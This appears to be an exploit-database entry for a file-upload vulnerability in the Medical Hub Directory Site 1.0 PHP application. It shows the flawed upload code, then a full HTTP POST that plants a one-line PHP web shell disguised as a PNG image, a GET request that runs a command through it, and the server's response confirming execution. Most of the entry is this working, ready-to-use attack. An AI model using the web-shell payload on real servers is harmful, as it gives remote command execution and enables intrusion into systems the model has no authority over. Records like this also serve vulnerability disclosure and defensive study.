@@ -1,0 +1,142 @@
+id: 37561
+date: 03/30/2022
+title: Medical Hub Directory Site 1.0 Shell Upload Vulnerability
+author: Hejap Zairy
+cves: 
+
+# Title: Medical Hub Directory Site  1.0  Shell Upload
+# Author: Hejap Zairy
+# Vendor: https://www.sourcecodester.com/php/15252/simple-medical-hub-directory-site-phpoop-source-code.html
+# Software:https://www.sourcecodester.com/sites/default/files/download/oretnom23/mhds.zip
+# Reference: https://github.com/Matrix07ksa
+# Tested on: Windows, MySQL, Apache
+
+
+registered user can bypass waf upload .php.png files in attachments section with use of intercept tool in burbsuite to edit the raw
+
+
+#vulnerability Code  php
+Needs more filtering to upload profile files
+
+php```
+$img_err= "";
+    if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
+      $fname = 'uploads/system-logo.png';
+      $dir_path =base_app. $fname;
+      $upload = $_FILES['img']['tmp_name'];
+      $type = mime_content_type($upload);
+      $allowed = array('image/png','image/jpeg');
+      if(!in_array($type,$allowed)){
+        $img_err.=" But Logo Image failed to upload due to invalid file type.";
+      }else{
+        // $new_height = 200; 
+        // $new_width = 200; 
+    
+        list($width, $height) = getimagesize($upload);
+        $t_image = imagecreatetruecolor($width, $height);
+        $black = imagecolorallocate($t_image, 0, 0, 0);
+        imagecolortransparent($t_image, $black);
+        imagealphablending( $t_image, false );
+        imagesavealpha( $t_image, true );
+        $gdImg = ($type == 'image/png')? imagecreatefrompng($upload) : imagecreatefromjpeg($upload);
+        imagecopyresampled($t_image, $gdImg, 0, 0, 0, 0, $width, $height, $width, $height);
+        if($gdImg){
+            if(is_file($dir_path))
+            unlink($dir_path);
+            $uploaded_img = imagepng($t_image,$dir_path);
+            if($uploaded_img){
+              if(isset($_SESSION['system_info']['logo'])){
+                $qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'logo' ");
+              }else{
+                $qry = $this->conn->query("INSERT into system_info set meta_value =  CONCAT('{$fname}','?v=',unix_timestamp(CURRENT_TIMESTAMP)),meta_field = 'logo' ");
+              }
+            }
+            imagedestroy($gdImg);
+            imagedestroy($t_image);
+        }else{
+        $img_err.=" But Logo Image failed to upload due to unkown reason.";
+        }
+      }
+    }
+```
+
+
+[+] Payload POST
+
+
+```
+POST /mhds/admin/?page=manage_account HTTP/1.1
+Host: 0day.gov
+Cookie: PHPSESSID=2vah9hmhjf85ichdav814rhcgu
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------409902128312379197203124536738
+Content-Length: 882
+Origin: https://0day.gov
+Referer: https://0day.gov/mhds/
+Upgrade-Insecure-Requests: 1
+Te: trailers
+Connection: close
+
+-----------------------------409902128312379197203124536738
+Content-Disposition: form-data; name="productName"
+Hejap Zairy
+-----------------------------409902128312379197203124536738
+Content-Disposition: form-data; name="productimage1"; filename="0day_hejap.php"
+Content-Type: image/png
+
+<?=`$_GET[515]`?>
+
+-----------------------------409902128312379197203124536738
+Content-Disposition: form-data; name="submit"
+-----------------------------409902128312379197203124536738--
+```
+
+
+#Status: CRITICAL
+
+[+] Payload GET
+
+```
+GET /mhds/uploads/users/0day_hejap.png.php?515=echo+Hejap+Zairy HTTP/1.1
+
+Host: 0day.gov
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=pqbgvck1gedt9if6p582nt9a41
+Upgrade-Insecure-Requests: 1
+
+
+
+
+```
+
+#Response 
+```
+HTTP/1.1 200 OK
+Date: Thu, 30 Mar 2022 11:15:56 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/7.4.27
+X-Powered-By: PHP/7.4.27
+Content-Length: 12
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Hejap Zairy
+```
+
+
+# Description:
+The file upload  bypass WAF vulnerability occurs when the user uploads an executable script file, and through the script file to obtain the ability to execute server-side commands. This attack is the most direct and effective, sometimes having almost no technical barriers.
+
+
+# Proof and Exploit:
+https://i.imgur.com/N9rKLB4.png
+https://i.imgur.com/CrpqRox.png
+https://i.imgur.com/Un1sM4Q.png
+
+#  0day.today [2023-03-24]  #
